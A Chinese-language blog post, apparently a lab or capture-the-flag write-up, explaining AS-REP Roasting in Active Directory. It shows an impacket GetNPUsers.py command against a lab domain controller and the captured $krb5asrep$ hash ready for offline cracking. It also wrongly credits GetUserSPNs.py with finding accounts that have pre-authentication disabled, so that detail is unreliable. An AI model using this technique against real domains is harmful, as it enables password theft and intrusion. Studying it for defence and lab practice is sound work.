---
title: AS_REP Roasting
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# AS_REP Roasting

## 原理

当被攻击账号设置的是"不需要`kerberos`预身份验证"模式后（默认不勾选，所以比较局限）。相当于跳过的AS的验证，在AS_REP过程就可以任意伪造用户请求票据。`Kerberos` 预身份验证发生在 

`Kerberos` 身份验证的第一阶段（`AS_REQ&AS REP`），它的主要作用是防止密码离线爆破。默认情况下，预身份验证是开启的，`KDC` 会记录密码错误次数，防止在线爆破。

当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的 `Kerberos 88` 端口请求票据，此时域控不会进行任何验证就将 TGT 和该用户 Hash 加密的 Login Session Key 返回。因此，攻击者就可以对获取到的用户 `Hash` 加密的 `Login Session Key` 进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码。

## 实验

通过`impacket` 中的`GetNPUsers.py`能够找出那些在域中设置了 "无需 `Kerberos` 预认证" 的用户。将TGT和该用户Hash加密的Login Session Key 返回

通过 `GetUserSPNs.py` 枚举出关闭了预认证的用户，将TGT和该用户Hash加密的Login Session Key 返回

```python
GetNPUsers.py -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/ -usersfile username.txt | grep 'SOUPEDECODE.LOCAL' 
/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:fecb2e188b7b15d1a4ed208f1c2e462b$3f348276b715378bf6aece608de90fa7134900b6439f45fbc3cd3081dad69bceb94c332b5de16f17e2beabe48da6f5809835b440002fdcb615f4bfa9f0041affd29bbdf6b425d48216d03c5cb624b646e366e3186a2ecfd6cbe2631ef6540094d238de54e4353055ecc2bc8694a3fe53e0a68b99f339311540ed0033dad48d23b59b8568355a6adc48fe221793024cfdec3c1acee051fde18bc455aef282d44c1c5388fadc5a4908b2b8c35a9cb8655d1db7189880541995043f5321306a3778105f6e2079ccad5111ac5589f490d32ce03c12006fce2722aeb10211529818cd2e7cbcaf82862261b58f0775eb9e224651164c55585e
```

拿到用户`zximena448@SOUPEDECODE.LOCAL`的`Login Session Key`

下一步就是破解